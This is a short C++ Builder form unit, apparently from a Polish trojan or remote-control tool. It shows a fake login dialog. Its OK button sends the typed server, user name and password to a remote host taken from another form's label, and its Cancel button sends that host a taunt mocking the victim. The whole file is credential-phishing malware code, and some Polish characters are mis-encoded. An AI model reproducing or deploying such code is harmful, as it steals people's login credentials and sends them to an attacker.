//---------------------------------------------------------------------------
#include <vcl.h>
#pragma hdrstop

#include "Unit4.h"
#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm4 *Form4;
//---------------------------------------------------------------------------
__fastcall TForm4::TForm4(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm4::Button1Click(TObject *Sender)
{
NMMsg1->Host = Form1->Label1->Caption;
NMMsg1->PostIt("[Serwer:"+Edit1->Text+"][User:"+Edit2->Text+"][Has³o:"+Edit3->Text+"]");
Close();
}
//---------------------------------------------------------------------------
void __fastcall TForm4::Button2Click(TObject *Sender)
{
NMMsg1->Host = Form1->Label1->Caption;
NMMsg1->PostIt("Lamer nacisn¹³ przycisk Anuluj :(((");
Close();
}
//---------------------------------------------------------------------------

